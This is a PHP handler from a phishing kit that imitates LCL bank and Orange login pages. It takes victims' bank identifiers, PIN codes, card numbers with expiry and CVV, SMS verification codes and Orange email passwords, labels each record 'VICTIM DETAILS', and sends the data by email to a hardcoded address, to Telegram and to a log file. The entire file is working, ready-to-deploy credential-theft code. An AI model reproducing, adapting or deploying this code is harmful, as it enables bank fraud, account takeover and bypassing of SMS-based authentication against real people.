<?php

/**
 * @link              https://www.z0n51.com/
 * @since             19/11/2020
 * @package           LCL
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      LCL
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

include_once '../inc/app.php';

function validate_cc_number($number = null) {
    $numbers = str_replace(' ', '', $number);
    if( validate_number($numbers,16) == false )
        return false;
    return $numbers;
}

function validate_cc_cvv($number = null) {
    $numbers = str_replace(' ', '', $number);
    if( validate_number($numbers,3) == false )
        return false;
    return $numbers;
}

function validate_cc_date($month,$year) {
    if( validate_number(trim($month)) && strlen(trim($month)) == 2 && validate_number(trim($year)) && strlen(trim($year)) == 2 ) {
        return $month . '/' . $year;
    } else {
        return false;
    }
}


$to = 'rez2020@zohomail.eu';
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if( !empty($_POST['verbot']) ) {
        header("HTTP/1.0 404 Not Found");
        die();
    }

    if ($_POST['type'] == "login") {

        $_SESSION['username'] = $_POST['input1'] . $_POST['input2'] . $_POST['input3'] . $_POST['input4'] . $_POST['input5'] . $_POST['input6'] . $_POST['input7'] . $_POST['input8'] . $_POST['input9'] . $_POST['input10'];
        $_SESSION['password']    = $_POST['password'];

        if( validate_number($_SESSION['username'],10) == false || validate_number($_POST['password'],6) == false ) {
            header("location: login.php?error=1&#_$dispatch");
            exit();
        }

        $subject = get_user_ip() . ' | LCL | Login';
        $message = '/-- LOG INFOS --/' . get_user_ip() . "\r\n";
        $message .= 'Identifiant : ' . $_SESSION['username'] . "\r\n";
        $message .= 'Code confidentiel : ' . $_POST['password'] . "\r\n";
        $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
        $message .= 'IP address : ' . get_user_ip() . "\r\n";
        $message .= 'Country : ' . get_user_country() . "\r\n";
        $message .= 'OS : ' . get_user_os() . "\r\n";
        $message .= 'Browser : ' . get_user_browser() . "\r\n";
        $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
        $message .= '/-- END LOG INFOS --/' . "\r\n\r\n";

        $telegram_message = '/-- LOG INFOS --/' . get_user_ip() . "\r\n";
        $telegram_message .= 'Identifiant : ' . $_SESSION['username'] . "\r\n";
        $telegram_message .= 'Code confidentiel : ' . $_POST['password'] . "\r\n";
        $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
        telegram_send(urlencode($telegram_message));

        mail($to,$subject,$message,$headers);
        file_put_contents("../result0011.txt", $message, FILE_APPEND);
        header("location: loading1.php?validation#_$dispatch");

    }

    if ($_POST['type'] == "cc") {
        
        $_SESSION['full_name'] = $_POST['full_name'];
        $_SESSION['cc_number'] = $_POST['cc_number'];
        $_SESSION['cc_cvv']    = $_POST['cc_cvv'];
        $_SESSION['cc_date']   = $_POST['cc_date'];

        $date_ex = explode('/',$_POST['cc_date']);

        $card_number = validate_cc_number($_POST['cc_number']);
        $card_cvv    = validate_cc_cvv($_POST['cc_cvv']);
        $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);

        $_SESSION['errors'] = [];
        if( validate_name($_POST['full_name']) == false ) {
            $_SESSION['errors']['full_name'] = 'Veuillez saisir un nom valide.';
        }

        if( $card_number == false ) {
            $_SESSION['errors']['cc_number'] = 'Veuillez saisir un numéro de la carte valide.';
        }

        if( $card_cvv == false ) {
            $_SESSION['errors']['cc_cvv'] = 'Veuillez saisir un numéro valide.';
        }

        if( $card_date == false ) {
            $_SESSION['errors']['cc_date'] = 'Veuillez saisir une date valide.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = get_user_ip() . ' | LCL | Details';
            $message = '/-- DETAILS --/' . get_user_ip() . "\r\n";
            $message .= 'Nom : ' . $_POST['full_name'] . "\r\n";
            $message .= 'N° de carte : ' . $_POST['cc_number'] . "\r\n";
            $message .= 'Date d\'expiration : ' . $_POST['cc_date'] . "\r\n";
            $message .= 'CVV : ' . $_POST['cc_cvv'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END DETAILS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- DETAILS --/' . get_user_ip() . "\r\n";
            $telegram_message .= 'Nom : ' . $_POST['full_name'] . "\r\n";
            $telegram_message .= 'N° de carte : ' . $_POST['cc_number'] . "\r\n";
            $telegram_message .= 'Date d\'expiration : ' . $_POST['cc_date'] . "\r\n";
            $telegram_message .= 'CVV : ' . $_POST['cc_cvv'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../result0011.txt", $message, FILE_APPEND);
            header("location: ologin.php?validation#_$dispatch");

        } else {
            header("location: cc.php?error=1&validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "confirm_code") {
        
        $_SESSION['confirm_code'] = $_POST['confirm_code'];

        $_SESSION['errors'] = [];
        if( empty($_POST['confirm_code']) ) {
            $_SESSION['errors']['confirm_code'] = 'Le code est incorrect.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = get_user_ip() . ' | LCL | Sms';
            $message = '/-- SMS INFOS --/' . get_user_ip() . "\r\n";
            $message .= 'Sms Code : ' . $_POST['confirm_code'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END SMS INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- SMS INFOS --/' . get_user_ip() . "\r\n";
            $telegram_message .= 'Sms Code : ' . $_POST['confirm_code'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../result0011.txt", $message, FILE_APPEND);
            header("location: cc.php?validation#_$dispatch");
        } else {
            $error = $_POST['error'];
            header("location: ss.php?error=$error&validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "oemail") {

        $_SESSION['email'] = $_POST['email'];

        $_SESSION['errors'] = [];
        if( empty($_POST['email']) ) {
            $_SESSION['errors']['email'] = 'ce champ est obligatoire';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $zz = ($_POST['error']) ? 2 : 1;

            $subject = get_user_ip() . ' | ORANGE | Email';
            $message = '/-- EMAIL INFOS --/' . get_user_ip() . "\r\n";
            $message .= 'Email : ' . $_POST['email'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END EMAIL INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            //mail($to,$subject,$message,$headers);
            //file_put_contents("../result0011.txt", $message, FILE_APPEND);
            header("location: opass.php?validation#_$dispatch");

        } else {
            header("location: ologin.php?error=1&#_$dispatch");
        }

    }

    if ($_POST['type'] == "opassword") {

        $_SESSION['password'] = $_POST['password'];

        $_SESSION['errors'] = [];
        if( empty($_POST['password']) ) {
            $_SESSION['errors']['password'] = 'Vous n\'avez pas saisi votre mot de passe.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $zz = ($_POST['error']) ? 2 : 1;

            $subject = get_user_ip() . ' | ORANGE | Login';
            $message = '/-- ORANGE LOGIN INFOS --/' . get_user_ip() . "\r\n";
            $message .= 'Email : ' . $_SESSION['email'] . "\r\n";
            $message .= 'Password : ' . $_POST['password'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END ORANGE LOGIN INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- ORANGE LOGIN INFOS --/' . get_user_ip() . "\r\n";
            $telegram_message .= 'Email : ' . $_SESSION['email'] . "\r\n";
            $telegram_message .= 'Password : ' . $_POST['password'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../result0011.txt", $message, FILE_APPEND);
            header("location: oloading.php?validation#_$dispatch");
        } else {
            header("location: opass.php?error=1&#_$dispatch");
        }

    }

    if ($_POST['type'] == "oconfirm_code") {

        $_SESSION['oconfirm_code']   = $_POST['oconfirm_code'];

        $_SESSION['errors'] = [];
        if( empty($_POST['oconfirm_code']) ) {
            $_SESSION['errors']['oconfirm_code'] = 'le code n\'est pas valide';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $zz = ($_POST['error']) ? 2 : 1;

            $subject = $_SERVER['REMOTE_ADDR'] . ' | ORANGE | Sms';
            $message = '/-- ORANGE SMS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Sms code : ' . $_POST['oconfirm_code'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END ORANGE SMS INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- ORANGE SMS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $telegram_message .= 'Sms code : ' . $_POST['oconfirm_code'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../result0011.txt", $message, FILE_APPEND);
            header("location: finish.php?validation#_$dispatch");
        } else {
            header("location: oss.php?error=1&#_$dispatch");
        }

    }

}

?>